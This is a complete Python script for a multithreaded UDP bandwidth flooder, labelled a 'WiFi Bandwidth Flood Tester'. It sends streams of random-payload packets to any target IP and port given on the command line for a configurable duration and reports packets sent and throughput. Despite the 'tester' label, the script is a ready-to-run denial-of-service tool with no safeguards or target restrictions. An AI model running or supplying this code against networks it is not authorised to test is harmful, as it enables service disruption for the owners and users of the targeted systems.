import socket
import time
import threading
import random
import argparse
from datetime import datetime

class BandwidthFlooder:
    def __init__(self, target_ip, target_port, duration, packet_size, threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.packet_size = packet_size
        self.threads = threads
        self.sent_packets = 0
        self.sent_bytes = 0
        self.running = False

    def flood(self):
        data = random._urandom(self.packet_size)
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < self.duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (self.target_ip, self.target_port))
                self.sent_packets += 1
                self.sent_bytes += len(data)
                sock.close()
            except Exception as e:
                print(f"Error: {e}")
                break

    def start(self):
        self.running = True
        threads = []
        
        print(f"Starting bandwidth flood to {self.target_ip}:{self.target_port}")
        print(f"Duration: {self.duration} seconds | Packet size: {self.packet_size} bytes")
        print(f"Threads: {self.threads} | Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor progress
        start_time = time.time()
        while (time.time() - start_time) < self.duration and self.running:
            elapsed = time.time() - start_time
            remaining = max(0, self.duration - elapsed)
            print(f"\rElapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s | Packets: {self.sent_packets} | Data: {self.sent_bytes/(1024*1024):.2f} MB", end="")
            time.sleep(0.5)
        
        self.running = False
        for t in threads:
            t.join()
        
        total_time = time.time() - start_time
        throughput = (self.sent_bytes * 8) / (total_time * 1000 * 1000)  # Mbps
        
        print("\n\nTest completed!")
        print(f"Total packets sent: {self.sent_packets}")
        print(f"Total data sent: {self.sent_bytes/(1024*1024):.2f} MB")
        print(f"Average throughput: {throughput:.2f} Mbps")
        print(f"End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def main():
    parser = argparse.ArgumentParser(description="WiFi Bandwidth Flood Tester")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Test duration in seconds (default: 30)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads (default: 4)")
    
    args = parser.parse_args()
    
    flooder = BandwidthFlooder(
        target_ip=args.target_ip,
        target_port=args.port,
        duration=args.duration,
        packet_size=args.size,
        threads=args.threads
    )
    
    try:
        flooder.start()
    except KeyboardInterrupt:
        print("\nTest stopped by user")
        flooder.running = False

if __name__ == "__main__":
    main()
